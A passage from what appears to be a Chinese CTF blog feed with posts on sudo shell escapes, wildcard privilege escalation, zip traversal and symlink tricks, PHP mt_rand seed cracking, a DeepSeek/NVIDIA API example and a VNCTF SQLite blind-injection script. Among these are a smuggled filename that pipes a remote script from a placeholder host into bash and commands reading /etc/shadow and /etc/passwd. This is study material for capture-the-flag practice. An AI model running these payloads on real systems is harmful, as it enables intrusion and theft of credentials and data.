class="hljs-string">&#x27;!sh&#x27;</span><br><span class="hljs-built_in">sudo</span> awk <span class="hljs-string">&#x27;BEGIN &#123;system(&quot;/bin/sh&quot;)&#125;&#x27;</span><br><span class="hljs-built_in">sudo</span> xxd <span class="hljs-string">&quot;/etc/shadow&quot;</span> | xxd -r<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">env</span> /bin/sh<br><span class="hljs-built_in">sudo</span> perl -e <span class="hljs-string">&#x27;exec &quot;/bin/sh&quot;;&#x27;</span><br><span class="hljs-built_in">sudo</span> zip 2.zip 1.txt -T --unzip-command=<span class="hljs-string">&quot;sh -c /bin/sh&quot;</span><br><span class="hljs-built_in">sudo</span> sed -n <span class="hljs-string">&#x27;1e exec sh 1&gt;&amp;0&#x27;</span> /etc/passwd<br><span class="hljs-built_in">sudo</span> find /etc/passwd -<span class="hljs-built_in">exec</span> /bin/sh \;<br>两条命令提权的<br><span class="hljs-built_in">sudo</span> git <span class="hljs-built_in">help</span> config<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> ftp<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> less /etc/hosts<br>!sh<br><span class="hljs-built_in">sudo</span> ed<br>!/bin/sh<br><span class="hljs-built_in">sudo</span> man man<br>!/bin/sh<br></code></pre></td></tr></table></figure><h1 id="通配符提权"><a href="#通配符提权" class="headerlink" title="通配符提权"></a>通配符提权</h1><p>通配符：</p><figure class="highlight do"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs do"><span class="hljs-comment">* 代表任意数量的字符</span><br>? 字符代表单个字符<br>[] 匹配中括号中的任意单一字符 可以使用连字符-表示范围，比如[0-9]<br></code></pre></td></tr></table></figure><p>原理：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;3&quot;</span> &gt; --<span class="hljs-built_in">help</span><br></code></pre></td></tr></table></figure><p>生成一个<code>--help</code>文件，如果我们直接<code>cat --help</code>会显示cat的帮助</p><p>但是我们执行<code>cat *</code>就会输出–help</p><p>用法：</p><p>对于高权限计划任务如果使用通配符，那么我们就可以构造特殊的文件名，打到用高权限执行命令</p><p>例题：</p><h2 id="backup"><a href="#backup" class="headerlink" title="backup"></a>backup</h2><p>这个题目，呜呜呜，刚进去完全不知道要干嘛，第一次看源码也没翻到最下面，浅浅的翻了一下，第二天再看的时候才再最下面找到</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d7d936edd931ff0b32322c3228fe769a.png" alt="d7d936edd931ff0b32322c3228fe769a"></p><p>我们直接再上传<code>?_[2025.happy.new.year=curl http;//ip:port/1.sh|bash</code>成功拿到shell</p><p>查看根目录发现有flag，但是权限不够</p><p>尝试suid提权但是没有</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/d720cfebd70d29e1289e1429f571c8cd.png" alt="d720cfebd70d29e1289e1429f571c8cd"></p><p>看一下<code>ps -ef</code>看看执行了什么</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250210235408861.png" alt="image-20250210235408861"></p><p>发先执行了<code>/start.sh</code>和<code>backup.sh</code></p><p>start没有权限看不了，那就看backup</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-keyword">while</span> :<br><span class="hljs-keyword">do</span><br>    <span class="hljs-built_in">cp</span> -P * /var/www/html/backup/<br>    <span class="hljs-built_in">chmod</span> 755 -R /var/www/html/backup/<br>    <span class="hljs-built_in">sleep</span> 15s<br><br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><p>发现他会一直执行，刚开始的思路是环境变量劫持sleep函数让他执行<code>cat /flag &gt; /var/www/html/backup/1</code></p><p>再<code>export PATH=/tmp:$PATH</code>再创建一个<code>/tmp/sleep</code>为<code>cat /flag &gt; /var/www/html/backup/1</code>给权限</p><p>我自己尝试会执行<code>/tem/sleep</code>但由于没有权限就是空文件，但是backp.sh不会执行这个文件，不知道为什么</p><p>后来发现<code>backup.sh</code>使用了通配符<code>*</code>那我们是不是可以再文件名上下手</p><p>刚刚好cp有一个参数<code>-H</code>可以让软链接也被复制</p><p>那么就可以实现</p><p>payload：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> /var/www/html/primary<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;-H&quot;</span>  不是常规文件名不可以用<span class="hljs-built_in">touch</span><br><span class="hljs-built_in">ln</span> -s /flag 1<br></code></pre></td></tr></table></figure><p>然后等一会发现<code>/backup</code>文件夹中有1</p><p>再读取1拿到flag</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>zip文件逃逸漏洞</title>
    <link href="/tuyi/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/"/>
    <url>/tuyi/2025/02/15/zip%E6%96%87%E4%BB%B6%E9%80%83%E9%80%B8%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="zip文件目录穿越"><a href="#zip文件目录穿越" class="headerlink" title="zip文件目录穿越"></a>zip文件目录穿越</h1><p>目录结构：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">├── /app                               <br>│   ├── /app.py                         <br>│   ├── /uploads                       <br>│   ├── /templates                   <br>│   └── /.config <br>│── home<br></code></pre></td></tr></table></figure><p>我们上传文件的目录在<code>uploads</code>，我们想要覆盖app.py，那解释<code>../app.py</code></p><p>我们把要覆盖的文件打包成压缩包，压缩包名字写成<code>..1app.py</code></p><p>然后把文件用<code>notepad++</code>打开把<code>1</code>改成<code>/</code></p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250215202207812.png" alt="image-20250215202207812"></p><p>有两处都要改</p><h1 id="软链接打包"><a href="#软链接打包" class="headerlink" title="软链接打包"></a>软链接打包</h1><p>文件软链接到&#x2F;etc&#x2F;passwd等文件，达到任意文件读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">ln</span> -s /etc/passwd ./a   <span class="hljs-comment">#文件/etc/pawwsd软链接到a</span><br>zip --symlinks -r 1.zip ./a  <span class="hljs-comment">#将a文件压缩为1.zip</span><br></code></pre></td></tr></table></figure><p>解释：</p><blockquote><h3 id="symlinks："><a href="#symlinks：" class="headerlink" title="--symlinks："></a><code>--symlinks</code>：</h3><p>这个选项告诉 <code>zip</code> 在压缩符号链接（symlink）时，要保留其符号链接特性，而不是将它们转换成链接目标文件的实际内容</p></blockquote><p>这个仅适合哪些文件展示界面适用</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>zip文件逃逸</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>php伪随机数</title>
    <link href="/tuyi/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/"/>
    <url>/tuyi/2025/02/15/php%E4%BC%AA%E9%9A%8F%E6%9C%BA%E6%95%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="mt-rand-存在的问题"><a href="#mt-rand-存在的问题" class="headerlink" title="mt_rand()存在的问题"></a><strong>mt_rand()存在的问题</strong></h1><p>mt_rand()如何生成的随机整数，它与设置的seed值和调用该函数的次数有关，假设使用mt_srand(12345)进行了一次播种，那么第一次调用mt_rand生成的数值为a，第二次为b，第三次为c。所以当有人拿到与你一串一模一样的seed时，所执行的结果都是跟刚刚描述的一样，这样就可以预测出接下来的数值是多少<br>验证：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当rand值为123时生成的伪随机数列：\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">11111111</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当rand值为11111111时生成的伪随机数列:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当rand值为123时生成的伪随机数列:\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$k</span>=<span class="hljs-number">0</span> ;<span class="hljs-variable">$k</span> &lt; <span class="hljs-number">5</span>; <span class="hljs-variable">$k</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-number">123</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;当rand值为123时生成的伪随机数列：\n&quot;</span>;<br><span class="hljs-keyword">for</span>(<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-number">5</span> ;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">mt_rand</span>().<span class="hljs-string">&quot;\n&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs dns">当rand值为<span class="hljs-number">123</span>时生成的伪随机数列：<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br>当rand值为<span class="hljs-number">11111111</span>时生成的伪随机数列:<br><span class="hljs-number">1275140870</span><br><span class="hljs-number">304669862</span><br><span class="hljs-number">188245067</span><br><span class="hljs-number">1742075826</span><br><span class="hljs-number">1668666189</span><br>当rand值为<span class="hljs-number">123</span>时生成的伪随机数列:<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br>当rand值为<span class="hljs-number">123</span>时生成的伪随机数列：<br><span class="hljs-number">1495656191</span><br><span class="hljs-number">1531059894</span><br><span class="hljs-number">614479551</span><br><span class="hljs-number">920134305</span><br><span class="hljs-number">487159790</span><br></code></pre></td></tr></table></figure><p>发现对于一个种子，题目随机数生成的是一样的</p><h1 id="php-mt-seed4-0工具"><a href="#php-mt-seed4-0工具" class="headerlink" title="php_mt_seed4.0工具"></a>php_mt_seed4.0工具</h1><p>安装：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">git <span class="hljs-built_in">clone</span> https://github.com/openwall/php_mt_seed<br><span class="hljs-built_in">cd</span> php_mt_seed<br>make<br></code></pre></td></tr></table></figure><p>运行方法：</p><blockquote><p>time 开头，使用 .&#x2F; 执行我们的程序，后面再接上希望逆推的随机数字节</p></blockquote><p>随机数转字节</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">php_mt_seed</span>(<span class="hljs-params"><span class="hljs-variable">$dict</span></span>) </span>&#123;<br>    <span class="hljs-variable">$chars</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789&#x27;</span>;<br>    <span class="hljs-variable">$response</span> = <span class="hljs-string">&quot;&quot;</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$i</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$dict</span>); <span class="hljs-variable">$i</span>++) &#123;<br>        <span class="hljs-keyword">for</span> (<span class="hljs-variable">$j</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$j</span> &lt; <span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>); <span class="hljs-variable">$j</span>++) &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-variable">$dict</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$chars</span>[<span class="hljs-variable">$j</span>]) &#123;<br>                <span class="hljs-variable">$response</span> .= <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; &#x27;</span> . <span class="hljs-variable">$j</span> . <span class="hljs-string">&#x27; 0 &#x27;</span> . (<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$chars</span>) - <span class="hljs-number">1</span>) . <span class="hljs-string">&#x27; &#x27;</span>;<br>                <span class="hljs-keyword">break</span>;<br>            &#125;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$response</span>;<br>&#125;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">php_mt_seed</span>(<span class="hljs-string">&quot;输入&quot;</span>);<br></code></pre></td></tr></table></figure><h1 id="特殊情况"><a href="#特殊情况" class="headerlink" title="特殊情况"></a>特殊情况</h1><p>而且数据可以按次数推的，如果运行了两次随机数</p><p>假设生成了12位的随机字符串，生成了两次，我们不知道第一次的，但是知道第二次的</p><p>我们可以再第二次处理后的字节前加上12组<code>0 0 0 0</code></p><p>也可以将种子爆破出来</p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>php伪随机数</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>API</title>
    <link href="/tuyi/2025/02/15/API%E4%B8%8Edeepseek/"/>
    <url>/tuyi/2025/02/15/API%E4%B8%8Edeepseek/</url>
    
    <content type="html"><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="什么是API"><a href="#什么是API" class="headerlink" title="什么是API"></a>什么是API</h2><p>AI的API基本都遵循openai的最早发布的API格式(以deepseek为例)：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://api.deepseek.com/chat/completions \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -H <span class="hljs-string">&quot;Authorization: Bearer &lt;DeepSeek API Key&gt;&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-chat&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>解释</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://api.deepseek.com/chat/completions <br></code></pre></td></tr></table></figure><blockquote><p>请求头部：你要请求的服务提供商</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span><br></code></pre></td></tr></table></figure><blockquote><p>请求格式：设置为json格式   ps:API都是POST传参</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">-H <span class="hljs-string">&quot;Authorization: Bearer &lt;DeepSeek API Key&gt;&quot;</span> <br></code></pre></td></tr></table></figure><blockquote><p>你的API密钥</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">-d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-chat&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p>发送的数据：</p><p>model：模型名称；以官方为准</p><p>messages：消息主体,以字典数组格式。role：用户    content：消息</p></blockquote><p>但是我的deekseek没钱了，用NAIDIA做演示一样的</p><p>发送</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl https://integrate.api.nvidia.com/v1/chat/completions \<br>  -H <span class="hljs-string">&quot;Content-Type: application/json&quot;</span> \<br>  -H <span class="hljs-string">&quot;Authorization: Bearer API-key&quot;</span> \<br>  -d <span class="hljs-string">&#x27;&#123;</span><br><span class="hljs-string">        &quot;model&quot;: &quot;deepseek-ai/deepseek-r1&quot;,</span><br><span class="hljs-string">        &quot;messages&quot;: [</span><br><span class="hljs-string">          &#123;&quot;role&quot;: &quot;user&quot;, &quot;content&quot;: &quot;Hello!&quot;&#125;</span><br><span class="hljs-string">        ]</span><br><span class="hljs-string">      &#125;&#x27;</span><br></code></pre></td></tr></table></figure><p>回显</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;id&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;ae53374d84f74e1baf5e47f70108fd24&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;object&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;chat.completion&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;created&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1739601068</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;model&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;deepseek-ai/deepseek-r1&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;choices&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">[</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;index&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">0</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;message&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;role&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;assistant&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;content&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&lt;think&gt;\n\n&lt;/think&gt;\n\nHello! How can I assist you today? 😊&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;tool_calls&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;logprobs&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;finish_reason&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;stop&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;matched_stop&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">1</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">]</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;usage&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;prompt_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">5</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;total_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">21</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;completion_tokens&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-number">16</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;prompt_tokens_details&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-literal"><span class="hljs-keyword">null</span></span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><p><code>&#123;&quot;role&quot;:&quot;assistant&quot;,&quot;content&quot;:&quot;&lt;think&gt;\n\n&lt;/think&gt;\n\nHello! How can I assist you today? 😊&quot;,&quot;tool_calls&quot;:null&#125;</code></p>]]></content>
    
    
    <categories>
      
      <category>知识点</category>
      
    </categories>
    
    
    <tags>
      
      <tag>API</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>VNCTF-web</title>
    <link href="/tuyi/2025/02/11/VNCTF-web/"/>
    <url>/tuyi/2025/02/11/VNCTF-web/</url>
    
    <content type="html"><![CDATA[<h1 id="奶龙回家"><a href="#奶龙回家" class="headerlink" title="奶龙回家"></a>奶龙回家</h1><p> 输入<code>1&#39;</code>回显</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130506725.png" alt="image-20250214130506725"></p><p>但是输入<code>1&#39;&#39;</code>两个单引号</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214130543617.png" alt="image-20250214130543617"></p><p>正常回显，说明存在sql注入</p><p>先fuzz一下</p><p><img src="https://tuyiblog.oss-cn-guangzhou.aliyuncs.com/blog/image-20250214131102161.png" alt="image-20250214131102161"></p><p>过滤了一点而且对大小写敏感，猜测是<code>sqlite</code>(也可能是正则），打时间盲注，那他过滤sleep干嘛，迷惑我们吗</p><p>既然猜测是<code>sqlite</code>那就使用<code>randombolb</code>函数试试</p><p>空格使用<code>/**/</code>过滤</p><p>尝试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sqlite">payload = &quot;&#x27;OR/**/(case/**/when(substr(sqlite_version(),1,1)&lt;&#x27;310&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end);--&quot;<br></code></pre></td></tr></table></figure><p>大佬的脚本(二分法)                                                                          </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&#x27;http://node.vnteam.cn:47163/login&#x27;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, <span class="hljs-number">50</span>):<br>    head = <span class="hljs-number">32</span><br>    tail = <span class="hljs-number">127</span><br>    <span class="hljs-keyword">while</span> head &lt; tail:<br>        mid = (head + tail) // <span class="hljs-number">2</span><br>        <span class="hljs-comment"># payload = &#x27;sqlite_version()&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(sql)/**/from/**/sqlite_master&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(sql)/**/FROM/**/sqlite_master/**/WHERE/**/type=\&#x27;table\&#x27;/**/AND/**/name=\&#x27;users\&#x27;;&#x27;</span><br>        <span class="hljs-comment"># payload = &#x27;select/**/group_concat(username)/**/from/**/users&#x27;</span><br>        payload = <span class="hljs-string">&#x27;select/**/group_concat(password)/**/from/**/users&#x27;</span><br>        username = <span class="hljs-string">&#x27;baozongwi&#x27;</span><br>        char = <span class="hljs-built_in">chr</span>(mid)<br>        password = <span class="hljs-string">&quot;&#x27;or/**/(case/**/when(substr((&#123;&#125;),&#123;&#125;,1)&gt;&#x27;&#123;&#125;&#x27;)/**/then/**/randomblob(1000000000)/**/else/**/0/**/end)--&quot;</span>.<span class="hljs-built_in">format</span>(<br>            payload, i, char)<br>        json = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: username,<br>            <span class="hljs-string">&quot;password&quot;</span>: password<br>        &#125;<br>        <span class="hljs-keyword">try</span>:<br>            res = requests.post(url=url, json=json, timeout=<span class="hljs-number">3</span>)<br>        <span class="hljs-keyword">except</span> Exception:<br>            head = mid + <span class="hljs-number">1</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]trying: <span class="hljs-subst">&#123;result&#125;</span>[<span class="hljs-subst">&#123;head&#125;</span>-<span class="hljs-subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            tail = mid<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;\r[*]trying: <span class="hljs-subst">&#123;result&#125;</span>[<span class="hljs-subst">&#123;head&#125;</span>-<span class="hljs-subst">&#123;tail&#125;</span>]&#x27;</span>, end=<span class="hljs-string">&#x27;&#x27;</span>)<br><br>    result += <span class="hljs-built_in">chr</span>(head)<br>    <span class="hljs-built_in">print</span>(<span 